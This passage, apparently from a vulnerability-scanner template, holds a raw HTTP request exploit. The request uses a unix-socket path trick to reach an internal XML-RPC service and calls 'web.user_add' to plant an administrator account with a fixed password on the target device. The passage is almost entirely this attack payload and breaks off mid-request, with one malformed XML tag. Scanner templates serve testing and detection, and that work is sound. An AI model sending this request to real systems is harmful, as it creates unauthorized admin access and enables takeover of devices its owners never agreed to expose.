      - |
        POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        <?xml version="1.0"?>  
        <methodCall>
        <methodName>web.user_add</methodName>
        <params>
        <param>
        <value>
        <array>
        <data>
        <value>
        <string>admin</string>
        </value>
        <value>
        <string>5</string>
        </value>
        <value>
        string>10.0.0.1</string>
        </value>
        </data>
        </array>
        </value>
        </param>
        <param>
        <value>
        <struct>
        <member>
        <name>uname</name>
        <value>
        <string>aassddssdd</string>
        </value>
        </member>
        <member>
        <name>name</name>
        <value>
        <string>test123</string>
        </value>
        </member>
        <member>
        <name>pwd</name>
        <value>
        <string>P@ssw0rd</string>
        </value>
        </member>
        <member>
